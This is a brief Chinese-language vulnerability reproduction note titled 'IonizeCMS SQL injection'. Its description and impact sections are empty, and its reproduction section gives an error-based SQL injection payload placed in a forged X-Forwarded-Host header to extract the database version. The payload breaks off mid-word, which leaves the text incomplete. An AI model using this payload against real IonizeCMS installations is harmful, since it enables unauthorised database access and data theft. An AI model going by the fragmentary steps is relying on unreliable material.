IonizeCMS sql注入
=================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

伪造HTTP头注入 在抓包哇：

    X-Forwarded-Host: 'and(select 1 from(select count(*),concat((select concat(0x5e5e5e,version(),0x5e5e5e) from informa
